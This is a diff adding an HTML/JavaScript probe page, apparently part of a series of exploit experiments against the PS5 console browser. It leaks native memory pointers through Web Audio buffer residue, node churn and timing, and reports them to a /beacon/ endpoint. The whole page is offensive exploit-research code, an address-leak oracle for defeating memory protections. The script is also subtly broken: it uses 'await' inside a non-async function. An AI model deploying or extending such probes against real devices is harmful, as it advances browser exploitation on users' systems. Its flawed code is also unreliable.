@@ -1,0 +1,403 @@
+<!--
+  p771: Web Audio API buffer residue / allocation oracle
+
+  The Web Audio API (AudioContext, AudioBuffer, ScriptProcessorNode)
+  allocates native float arrays for audio sample data. These buffers
+  are separate from the JS heap and live in WebCore's audio subsystem.
+
+  Key insight: AudioBuffer objects hold Float32Array channels backed
+  by native memory. When an AudioBuffer is GC'd, its backing store
+  is freed. The audio subsystem may allocate from a different pool
+  than the JS ArrayBuffer allocator, so freed audio buffers might
+  contain different residual data -- potentially including C++ object
+  pointers from the audio graph node internals.
+
+  Additionally: ScriptProcessorNode (deprecated but still present on
+  605.1.15) receives audio data in its onaudioprocess callback. The
+  input/output AudioBuffer objects are created per-callback and their
+  backing memory is recycled. If the recycling is not properly zeroed,
+  we might observe residual data from previous audio processing cycles
+  or from the audio thread's allocations.
+
+  AnalyserNode.getFloatFrequencyData() writes FFT results into a
+  provided Float32Array. The FFT computation happens in C++ and the
+  internal FFT buffer might leak information about its allocation
+  context through timing or through uninitialized padding bytes.
+
+  Attack angles:
+  A) AudioBuffer channel data residue after GC.
+  B) ScriptProcessorNode recycled buffer observation.
+  C) AnalyserNode FFT internal buffer timing/residue.
+  D) AudioContext state change timing as allocator probe.
+  E) Decoding audio via decodeAudioData with controlled input.
+  F) OscillatorNode/GainNode connect/disconnect allocation churn.
+
+  CRASH_CLASS: LOW (audio API, no side effects beyond brief sound)
+  prior art: none (Web Audio untested on PS5 14.10)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p771</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(hi){
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p771-START');
+
+// === Section A: AudioBuffer channel data residue ===
+try{
+  b('A-audiobuffer-residue');
+  var aHits=0;
+
+  if(typeof AudioContext==='undefined' && typeof webkitAudioContext==='undefined'){
+    b('A-SKIP no AudioContext');
+  }else{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    var ctx=new AC();
+    b('A sampleRate='+ctx.sampleRate+' state='+ctx.state);
+
+    var buffers=[];
+    var sizes=[128,256,512,1024,2048,4096];
+    for(var si=0;si<sizes.length;si++){
+      var len=sizes[si];
+      for(var i=0;i<30;i++){
+        var buf=ctx.createBuffer(2,len,ctx.sampleRate);
+        var ch0=buf.getChannelData(0);
+        var ch1=buf.getChannelData(1);
+        for(var j=0;j<len;j++){
+          ch0[j]=Math.sin(j*0.1)*0.5;
+          ch1[j]=Math.cos(j*0.1)*0.5;
+        }
+        buffers.push(buf);
+      }
+    }
+    b('A created '+buffers.length+' AudioBuffers');
+
+    buffers=null;
+    for(var i=0;i<5000;i++){var tmp=new ArrayBuffer(128);}
+
+    for(var si=0;si<sizes.length;si++){
+      var byteLen=sizes[si]*4;
+      var szHits=0;
+      for(var i=0;i<100;i++){
+        var ab=new ArrayBuffer(byteLen);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=byteLen;off+=8){
+          var hi=dv.getUint32(off+4,true);
+          if(isPtr(hi)){
+            szHits++;
+            if(szHits<=2)b('A-PTR samples='+sizes[si]+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+      b('A samples='+sizes[si]+' bytes='+byteLen+' hits='+szHits);
+    }
+    ctx.close();
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: ScriptProcessorNode recycled buffer ===
+try{
+  b('B-scriptprocessor');
+  if(typeof AudioContext==='undefined' && typeof webkitAudioContext==='undefined'){
+    b('B-SKIP');
+  }else{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    var ctx=new AC();
+    var bHits=0;
+    var callCount=0;
+    var maxCalls=50;
+
+    try{
+      var osc=ctx.createOscillator();
+      osc.frequency.value=440;
+      var proc=ctx.createScriptProcessor(1024,1,1);
+
+      var nonZeroBuffers=0;
+      proc.onaudioprocess=function(e){
+        callCount++;
+        if(callCount>maxCalls)return;
+
+        var inp=e.inputBuffer.getChannelData(0);
+        var out=e.outputBuffer.getChannelData(0);
+
+        var inpNonZero=0;
+        var buf=new ArrayBuffer(inp.length*4);
+        var f32=new Float32Array(buf);
+        var u32=new Uint32Array(buf);
+        for(var i=0;i<inp.length;i++){
+          f32[i]=inp[i];
+          if(inp[i]!==0)inpNonZero++;
+        }
+
+        for(var i=0;i+1<u32.length;i+=2){
+          var hi=u32[i+1];
+          if(isPtr(hi)){
+            bHits++;
+            if(bHits<=3){
+              var lo=u32[i];
+              b('B-PTR call='+callCount+' sample='+i+' val=0x'+hi.toString(16)+(lo>>>0).toString(16).padStart(8,'0'));
+            }
+          }
+        }
+
+        if(inpNonZero>0)nonZeroBuffers++;
+        for(var i=0;i<out.length;i++)out[i]=0;
+      };
+
+      osc.connect(proc);
+      proc.connect(ctx.destination);
+      osc.start();
+
+      await new Promise(function(resolve){setTimeout(resolve,3000);});
+      osc.stop();
+      osc.disconnect();
+      proc.disconnect();
+      b('B calls='+callCount+' nonZeroBuffers='+nonZeroBuffers+' hits='+bHits);
+    }catch(e){
+      b('B-proc-err '+e.message);
+    }
+    ctx.close();
+  }
+  b('B-DONE');
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: AnalyserNode FFT data ===
+try{
+  b('C-analyser');
+  if(typeof AudioContext==='undefined' && typeof webkitAudioContext==='undefined'){
+    b('C-SKIP');
+  }else{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    var ctx=new AC();
+    var analyser=ctx.createAnalyser();
+    analyser.fftSize=2048;
+    var bufLen=analyser.frequencyBinCount;
+    b('C fftSize='+analyser.fftSize+' bins='+bufLen);
+
+    var osc=ctx.createOscillator();
+    osc.frequency.value=1000;
+    osc.connect(analyser);
+    analyser.connect(ctx.destination);
+    osc.start();
+
+    await new Promise(function(resolve){setTimeout(resolve,500);});
+
+    var freqData=new Float32Array(bufLen);
+    var timeData=new Float32Array(bufLen);
+    analyser.getFloatFrequencyData(freqData);
+    analyser.getFloatTimeDomainData(timeData);
+
+    var freqNonDefault=0,timeNonZero=0;
+    var freqBuf=new ArrayBuffer(freqData.length*4);
+    var fu32=new Uint32Array(freqBuf);
+    var ff32=new Float32Array(freqBuf);
+    for(var i=0;i<freqData.length;i++)ff32[i]=freqData[i];
+
+    var cHits=0;
+    for(var i=0;i+1<fu32.length;i+=2){
+      var hi=fu32[i+1];
+      if(isPtr(hi)){
+        cHits++;
+        if(cHits<=3){
+          var lo=fu32[i];
+          b('C-FREQ-PTR i='+i+' val=0x'+hi.toString(16)+(lo>>>0).toString(16).padStart(8,'0')+' float='+freqData[i/2]);
+        }
+      }
+    }
+
+    for(var i=0;i<freqData.length;i++){
+      if(freqData[i]!==-Infinity && freqData[i]!==0)freqNonDefault++;
+    }
+    for(var i=0;i<timeData.length;i++){
+      if(timeData[i]!==0)timeNonZero++;
+    }
+    b('C freq_nondefault='+freqNonDefault+'/'+bufLen+' time_nonzero='+timeNonZero+'/'+bufLen+' ptr_hits='+cHits);
+
+    osc.stop();
+    osc.disconnect();
+    analyser.disconnect();
+    ctx.close();
+  }
+  b('C-DONE');
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: AudioContext state timing ===
+try{
+  b('D-state-timing');
+  if(typeof AudioContext==='undefined' && typeof webkitAudioContext==='undefined'){
+    b('D-SKIP');
+  }else{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    var times=[];
+    for(var trial=0;trial<10;trial++){
+      var t0=performance.now();
+      var ctx=new AC();
+      var t1=performance.now();
+      times.push(t1-t0);
+      ctx.close();
+    }
+    var mn=times[0],mx=times[0],sum=0;
+    for(var i=0;i<times.length;i++){
+      if(times[i]<mn)mn=times[i];
+      if(times[i]>mx)mx=times[i];
+      sum+=times[i];
+    }
+    b('D create_10x min='+mn.toFixed(2)+' max='+mx.toFixed(2)+' avg='+(sum/10).toFixed(2)+'ms');
+
+    var ctx2=new AC();
+    var nodeTimes=[];
+    for(var trial=0;trial<100;trial++){
+      var t0=performance.now();
+      var nodes=[];
+      for(var i=0;i<20;i++){
+        nodes.push(ctx2.createGain());
+        nodes.push(ctx2.createBiquadFilter());
+        nodes.push(ctx2.createDelay());
+      }
+      var t1=performance.now();
+      nodeTimes.push(t1-t0);
+      nodes=null;
+    }
+    mn=nodeTimes[0];mx=nodeTimes[0];sum=0;
+    for(var i=0;i<nodeTimes.length;i++){
+      if(nodeTimes[i]<mn)mn=nodeTimes[i];
+      if(nodeTimes[i]>mx)mx=nodeTimes[i];
+      sum+=nodeTimes[i];
+    }
+    b('D node_create_60x100 min='+mn.toFixed(2)+' max='+mx.toFixed(2)+' avg='+(sum/100).toFixed(2)+'ms');
+    ctx2.close();
+  }
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: decodeAudioData with controlled WAV ===
+try{
+  b('E-decode');
+  if(typeof AudioContext==='undefined' && typeof webkitAudioContext==='undefined'){
+    b('E-SKIP');
+  }else{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    var ctx=new AC();
+
+    function makeWAV(samples,sampleRate){
+      var numSamples=samples;
+      var dataSize=numSamples*2;
+      var buf=new ArrayBuffer(44+dataSize);
+      var dv=new DataView(buf);
+      var u8=new Uint8Array(buf);
+      u8.set([0x52,0x49,0x46,0x46],0);
+      dv.setUint32(4,36+dataSize,true);
+      u8.set([0x57,0x41,0x56,0x45],8);
+      u8.set([0x66,0x6D,0x74,0x20],12);
+      dv.setUint32(16,16,true);
+      dv.setUint16(20,1,true);
+      dv.setUint16(22,1,true);
+      dv.setUint32(24,sampleRate,true);
+      dv.setUint32(28,sampleRate*2,true);
+      dv.setUint16(32,2,true);
+      dv.setUint16(34,16,true);
+      u8.set([0x64,0x61,0x74,0x61],36);
+      dv.setUint32(40,dataSize,true);
+      for(var i=0;i<numSamples;i++){
+        var val=Math.sin(i*0.1)*16000;
+        dv.setInt16(44+i*2,val,true);
+      }
+      return buf;
+    }
+
+    var wavSizes=[256,1024,4096];
+    for(var wi=0;wi<wavSizes.length;wi++){
+      var ns=wavSizes[wi];
+      var wavBuf=makeWAV(ns,44100);
+      try{
+        var t0=performance.now();
+        var decoded=await ctx.decodeAudioData(wavBuf.slice(0));
+        var t1=performance.now();
+        b('E samples='+ns+' decoded_len='+decoded.length+' channels='+decoded.numberOfChannels+' time='+(t1-t0).toFixed(2)+'ms');
+
+        var ch=decoded.getChannelData(0);
+        var chBuf=new ArrayBuffer(ch.length*4);
+        var cu32=new Uint32Array(chBuf);
+        var cf32=new Float32Array(chBuf);
+        for(var i=0;i<ch.length;i++)cf32[i]=ch[i];
+        var eHits=0;
+        for(var i=0;i+1<cu32.length;i+=2){
+          if(isPtr(cu32[i+1])){
+            eHits++;
+            if(eHits<=2)b('E-PTR samples='+ns+' i='+i+' val=0x'+cu32[i+1].toString(16)+cu32[i].toString(16).padStart(8,'0'));
+          }
+        }
+        b('E samples='+ns+' ptr_hits='+eHits);
+      }catch(e){
+        b('E decode_err samples='+ns+' '+e.message);
+      }
+    }
+    ctx.close();
+  }
+  b('E-DONE');
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Node connect/disconnect allocation churn ===
+try{
+  b('F-churn');
+  if(typeof AudioContext==='undefined' && typeof webkitAudioContext==='undefined'){
+    b('F-SKIP');
+  }else{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    var ctx=new AC();
+    var fHits=0;
+
+    for(var round=0;round<5;round++){
+      var nodes=[];
+      for(var i=0;i<50;i++){
+        var g=ctx.createGain();
+        var bq=ctx.createBiquadFilter();
+        g.connect(bq);
+        bq.connect(ctx.destination);
+        nodes.push(g,bq);
+      }
+      for(var i=0;i<nodes.length;i++){
+        nodes[i].disconnect();
+      }
+      nodes=null;
+    }
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var SIZES=[48,64,96,128,192];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv.getUint32(off+4,true))){
+            szHits++;
+            if(szHits<=2)b('F-PTR sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      fHits+=szHits;
+      b('F sz='+sz+' hits='+szHits);
+    }
+    ctx.close();
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+setTimeout(function(){b('p771-COMPLETE');},500);
+};
+</script>
+</head>
+<body></body></html>
